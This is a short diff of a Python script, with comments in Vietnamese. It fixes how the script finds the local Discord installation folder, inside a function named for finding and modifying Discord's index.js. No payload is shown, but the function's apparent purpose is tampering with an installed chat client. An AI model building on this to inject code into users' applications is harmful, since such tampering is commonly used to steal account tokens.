@@ -2,7 +2,7 @@ import os
 
 def find_and_modify_index_js():
     # Đường dẫn thư mục %APPDATA%\Local\Discord\
-    discord_path = os.path.join(os.getenv('APPDATA'), 'Local', 'Discord')
+    discord_path = os.getenv('LOCALAPPDATA') + '\\Discord'
 
     # Tìm các thư mục con có tên bắt đầu bằng "app-"
     for subdir in os.listdir(discord_path):
